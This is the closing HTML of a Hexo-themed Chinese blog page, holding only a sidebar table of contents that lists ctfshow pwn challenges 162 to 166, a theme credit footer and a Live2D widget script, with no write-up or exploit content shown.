href="https://wpa.qq.com/msgrd?v=3&amp;uin=2867485668&amp;site=qq&amp;menu=yes"><i class="fa-brands fa-qq" alt="QQ"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-pwn-166"><span class="toc-number">1.</span> <span class="toc-text">ctfshow-pwn-166</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-pwn-165"><span class="toc-number">2.</span> <span class="toc-text">ctfshow-pwn-165</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-pwn-164"><span class="toc-number">3.</span> <span class="toc-text">ctfshow-pwn-164</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-pwn-163"><span class="toc-number">4.</span> <span class="toc-text">ctfshow-pwn-163</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-pwn-162"><span class="toc-number">5.</span> <span class="toc-text">ctfshow-pwn-162</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>